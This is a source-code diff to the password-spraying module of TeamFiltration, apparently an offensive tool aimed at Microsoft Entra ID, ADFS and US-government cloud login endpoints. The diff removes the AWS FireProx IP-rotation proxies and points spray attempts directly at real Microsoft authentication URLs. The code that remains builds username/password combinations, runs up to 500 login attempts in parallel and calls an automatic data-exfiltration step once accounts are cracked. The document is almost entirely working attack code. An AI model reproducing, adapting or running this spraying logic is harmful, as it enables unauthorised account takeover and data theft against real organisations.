@@ -212,7 +212,7 @@ namespace TeamFiltration.Modules
 
             var shuffleUsersBool = args.Contains("--shuffle-users");
             bool shufflePasswordsBool = args.Contains("--shuffle-passwords");
-            bool shuffleFireProxBool = args.Contains("--shuffle-regions");
+            bool shuffleFireProxBool = false; // removed
             bool autoExfilBool = args.Contains("--auto-exfil");
 
             List<string> passwordList = new List<string>() { };
@@ -340,7 +340,7 @@ namespace TeamFiltration.Modules
 
             //Generate a random sleep time based on min-max
             var currentSleepTime = (new Random()).Next(sleepInMinutesMin, sleepInMinutesMax);
-            var regionCounter = rnd.Next(_globalProperties.AWSRegions.Length - 1);
+            var regionCounter = 0;
 
         sprayCalc:
 
@@ -410,42 +410,21 @@ namespace TeamFiltration.Modules
             //Get all previous password and email combinations
             List<string> allCombos = databaseHandle.QueryAllCombos();
 
-            var fireProxList = new List<(Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl)>();
+            var targetEndpointList = new List<string>();
 
-            if (shuffleUsersBool)
-                bufferuserNameList = bufferuserNameList.Randomize().ToList();
-
-
-            for (int regionCount = 0; regionCount < _globalProperties.AWSRegions.Length; regionCount++)
+            // Build direct target endpoints
             {
                 if (_globalProperties.AADSSO)
-                    fireProxList.Add(_globalProperties.GetFireProxURLObject("https://autologon.microsoftazuread-sso.com", regionCount));
+                    targetEndpointList.Add(_globalProperties.GetDirectUrl("https://autologon.microsoftazuread-sso.com"));
                 else if (_globalProperties.UsCloud)
-                {
-                    var fireProxObject = _globalProperties.GetFireProxURLObject("https://login.microsoftonline.us", regionCount);
-                    fireProxObject.fireProxUrl = fireProxObject.fireProxUrl + "common/oauth2/token";
-                    fireProxList.Add(fireProxObject);
-
-
-                }
+                    targetEndpointList.Add(_globalProperties.GetDirectUrl("https://login.microsoftonline.us/common/oauth2/token"));
                 else if (_globalProperties.ADFS)
                 {
                     Uri adfsHost = new Uri(getUserRealmResult.ThirdPartyAuthUrl);
-                    (Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl) adfsFireProxObject = _globalProperties.GetFireProxURLObject($"https://{adfsHost.Host}", regionCount);
-                    string adfsFireProxUrl = adfsFireProxObject.fireProxUrl.TrimEnd('/') + $"{adfsHost.PathAndQuery}";
-                    adfsFireProxObject.fireProxUrl = adfsFireProxUrl;
-                    fireProxList.Add(adfsFireProxObject);
+                    targetEndpointList.Add((new Uri(new Uri($"https://{adfsHost.Host}"), adfsHost.PathAndQuery)).ToString());
                 }
-
                 else
-                {
-                    var fireProxObject = _globalProperties.GetFireProxURLObject("https://login.microsoftonline.com", regionCount);
-                    fireProxObject.fireProxUrl = fireProxObject.fireProxUrl + "common/oauth2/token";
-                    fireProxList.Add(fireProxObject);
-                }
-
-                if (!shuffleFireProxBool)
-                    break;
+                    targetEndpointList.Add(_globalProperties.GetDirectUrl("https://login.microsoftonline.com/common/oauth2/token"));
             }
 
 
@@ -458,10 +437,7 @@ namespace TeamFiltration.Modules
 
                    foreach (var password in passwordList)
                    {
-                       var fireProxObject = fireProxList.First();
-
-                       if (shuffleFireProxBool)
-                           fireProxObject = fireProxList.Randomize().First();
+                       var targetUrl = targetEndpointList.First();
 
                        //If this combo does NOT exsits, add it
                        if (!allCombos.Contains(userName.ToLower() + ":" + password))
@@ -474,8 +450,8 @@ namespace TeamFiltration.Modules
                                Username = userName,
                                Password = password,
                                //ComboHash = "",
-                               FireProxURL = fireProxObject.fireProxUrl,
-                               FireProxRegion = fireProxObject.Item2.Region,
+                               FireProxURL = targetUrl,
+                               FireProxRegion = "LOCAL",
                                ResourceClientId = randomResource.clientId,
                                ResourceUri = randomResource.Uri,
                                AADSSO = _globalProperties.AADSSO,
@@ -487,28 +463,18 @@ namespace TeamFiltration.Modules
                },
                  maxDegreeOfParallelism: 500);
 
-            if (_globalProperties.AWSRegions.Length - 1 == regionCounter)
-                regionCounter = 0;
-            else
-                regionCounter++;
+            regionCounter = 0;
 
             //If i get to this point without any spray items in listOfSprayAttempts,i have nothing left
             if (listOfSprayAttempts.Count() == 0)
             {
-                foreach (var fireProxObject in fireProxList)
-                {
-                    await _globalProperties._awsHandler.DeleteFireProxEndpoint(fireProxObject.Item1.RestApiId, fireProxObject.Item2.Region);
-                    Environment.Exit(0);
-                }
+                Environment.Exit(0);
             }
 
 
             var validAccounts = await SprayAttemptWrap(listOfSprayAttempts, _globalProperties, databaseHandle, getUserRealmResult, delayInSeconds, regionCounter);
 
-            foreach (var fireProxObject in fireProxList)
-            {
-                await _globalProperties._awsHandler.DeleteFireProxEndpoint(fireProxObject.Item1.RestApiId, fireProxObject.Item2.Region);
-            }
+            // No FireProx to cleanup
 
 
             if (autoExfilBool && validAccounts.Count() > 0)
